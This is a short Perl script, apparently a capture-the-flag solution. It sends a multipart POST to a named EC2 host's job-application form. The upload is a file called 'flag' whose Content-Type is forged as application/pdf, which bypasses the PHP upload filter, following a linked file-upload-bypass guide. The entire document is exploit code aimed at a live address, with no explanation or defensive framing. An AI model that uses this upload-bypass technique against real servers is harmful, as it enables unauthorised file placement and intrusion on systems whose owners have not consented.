#!/usr/bin/perl
#
# follow this : https://www.gremwell.com/sites/default/files/php-file-upload.pdf
use LWP;
use HTTP::Request::Common;
$ua = $ua = LWP::UserAgent->new;;
$res = $ua->request(POST 'http://ec2-34-214-177-6.us-west-2.compute.amazonaws.com/join-team/index.php?jobs',
 Content_Type => 'form-data',
 Content => [
 cv => ["flag", "flag", "Content-Type" =>
"application/pdf"],
 ],
 );
print $res->as_string();
